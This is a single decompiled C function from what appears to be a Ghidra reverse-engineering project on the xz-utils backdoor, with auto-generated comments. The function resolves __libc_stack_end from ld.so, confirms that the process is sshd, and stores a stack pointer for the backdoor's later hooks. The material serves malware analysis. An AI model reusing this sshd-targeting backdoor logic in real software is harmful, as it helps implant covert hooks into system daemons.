// /home/kali/xzre-ghidra/xzregh/103CE0_main_elf_resolve_stack_end_if_sshd.c
// Function: main_elf_resolve_stack_end_if_sshd @ 0x103CE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall main_elf_resolve_stack_end_if_sshd(main_elf_t * main_elf)


/*
 * AutoDoc: Parses the saved ld.so headers inside `main_elf_t`, resolves the versioned `__libc_stack_end` symbol, and confirms the captured runtime is sshd before publishing the pointer for later stages. Successful runs hand later hooks a stable way to reach argv/envp via `main_elf->libc_stack_end_slot`.
 */

#include "xzre_types.h"

BOOL main_elf_resolve_stack_end_if_sshd(main_elf_t *main_elf)

{
  elf_info_t *elf;
  BOOL parse_ok;
  Elf64_Sym *libc_stack_end_sym;
  void **libc_stack_end_ptr;
  
  // AutoDoc: Re-parse ld.so using the cached ELF header so the ldso `elf_info_t` is populated.
  parse_ok = elf_info_parse(main_elf->ldso_ehdr,main_elf->elf_handles->ldso);
  if ((parse_ok != FALSE) &&
     // AutoDoc: Resolve the versioned `__libc_stack_end` symbol from the interpreter image.
     (libc_stack_end_sym = elf_gnu_hash_lookup_symbol
                         (main_elf->elf_handles->ldso,STR_libc_stack_end,STR_GLIBC_2_2_5),
     libc_stack_end_sym != (Elf64_Sym *)0x0)) {
    elf = main_elf->elf_handles->ldso;
    // AutoDoc: Convert the symbol's st_value into a pointer inside ld.so's ELF image (double indirection).
    libc_stack_end_ptr = (void **)((u8 *)elf->elfbase + libc_stack_end_sym->st_value);
    // AutoDoc: Use `__libc_stack_end` to read sshd's argv/envp pointer and confirm the process really is sshd.
    parse_ok = sshd_validate_stack_argv_envp_layout(elf,*(u8 **)libc_stack_end_ptr);
    if (parse_ok != FALSE) {
      // AutoDoc: Publish the resolved pointer so later hooks can reach sshd's stack without redoing the ELF walk.
      *main_elf->libc_stack_end_slot = *(void **)libc_stack_end_ptr;
      return TRUE;
    }
  }
  return FALSE;
}

